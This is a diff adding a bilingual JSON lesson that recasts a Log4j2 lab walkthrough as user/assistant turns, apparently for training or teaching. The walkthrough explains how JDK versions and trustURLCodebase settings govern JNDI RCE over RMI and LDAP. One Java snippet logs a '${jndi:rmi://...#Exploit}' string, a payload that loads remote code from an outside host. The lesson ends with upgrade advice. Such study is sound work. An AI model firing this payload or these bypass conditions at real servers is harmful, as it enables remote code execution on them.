@@ -1,0 +1,90 @@
+{
+    "_source_md":  "Apache-Log4j2/2022-07-09-Apache-log4j2-affect-By-JDK-version-walkthrough.md",
+    "version":  "log4j2-jdk-version-bypass",
+    "title":  {
+                  "zh":  "Apache Log4j2 RCE JDK 版本限制实验：绕过与防护",
+                  "en":  "Apache Log4j2 RCE JDK Version Limit Experiment: Bypass and Protection"
+              },
+    "description":  {
+                        "zh":  "详细测试 Log4j2 远程代码执行漏洞在不同 JDK 版本下的表现，分析 RMI/LDAP 协议在不同 JDK 版本中的限制以及 setProperty 属性的影响。",
+                        "en":  "Detailed testing of Log4j2 remote code execution vulnerability behavior under different JDK versions, analyzing RMI/LDAP protocol restrictions in different JDK versions and the impact of setProperty attributes."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "JDK 版本对 Log4j2 漏洞有什么影响？",
+                                      "en":  "What impact does JDK version have on Log4j2 vulnerability?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户询问 JDK 版本限制",
+                                         "en":  "User asks about JDK version restrictions"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "import org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\npublic class log4j {\n    private static Logger logger = LogManager.getLogger(log4j.class);\n    public static void main(String[] args) {\n        System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\");\n        System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\");\n        logger.error(\"${jndi:rmi://192.168.3.50:4001/#Exploit}\");\n    }\n}",
+                                             "language":  "java"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "JDK 版本限制演进：JDK 6u45/7u21 后 java.rmi.server.useCodebaseOnly 默认为 true，禁用远程类文件加载；JDK 6u141/7u131/8u121 后增加 com.sun.jndi.rmi.object.trustURLCodebase 默认 false，禁止 RMI/CORBA 远程 codebase；JDK 6u211/7u201/8u191 后增加 com.sun.jndi.ldap.object.trustURLCodebase 默认 false，禁止 LDAP 远程 codebase。",
+                                      "en":  "JDK version restriction evolution: After JDK 6u45/7u21, java.rmi.server.useCodebaseOnly defaults to true, disabling remote class file loading; After JDK 6u141/7u131/8u121, added com.sun.jndi.rmi.object.trustURLCodebase defaults to false, prohibiting RMI/CORBA remote codebase; After JDK 6u211/7u201/8u191, added com.sun.jndi.ldap.object.trustURLCodebase defaults to false, prohibiting LDAP remote codebase."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "setProperty 属性如何影响漏洞利用？",
+                                      "en":  "How does setProperty attribute affect vulnerability exploitation?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "setProperty 影响分析：JDK 8u181(\u003c8u191) 时，开启 RMI/LDAP setProperty 都可 RCE；JDK 8u332(\u003e8u191) 时，只有开启 setProperty 的 RMI 可 RCE，LDAP 即使开启 setProperty 也无法利用。测试表格显示：低版本 JDK + setProperty 开启 = RCE 成功率高。",
+                                      "en":  "setProperty impact analysis: With JDK 8u181(\u003c8u191), RMI/LDAP setProperty enabled both can achieve RCE; With JDK 8u332(\u003e8u191), only RMI with setProperty enabled can achieve RCE, LDAP cannot be exploited even with setProperty enabled. Test table shows: Lower JDK version + setProperty enabled = Higher RCE success rate."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "RMI 和 LDAP 协议有什么区别？",
+                                      "en":  "What\u0027s the difference between RMI and LDAP protocols?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "协议对比：RMI 使用 jndi:rmi:// 协议，LDAP 使用 jndi:ldap:// 协议。JDK 版本越高，RMI 和 LDAP 的利用限制越多。在高版本 JDK 中，RMI 需要开启 setProperty 才能利用，而 LDAP 完全被禁止。防护建议：升级 JDK 到最新版本，避免使用不安全的 JNDI 查询。",
+                                      "en":  "Protocol comparison: RMI uses jndi:rmi:// protocol, LDAP uses jndi:ldap:// protocol. Higher JDK versions have more restrictions on RMI and LDAP exploitation. In high version JDK, RMI requires setProperty enabled for exploitation, while LDAP is completely prohibited. Protection recommendation: Upgrade JDK to latest version, avoid using insecure JNDI lookups."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  }
+              ]
+}
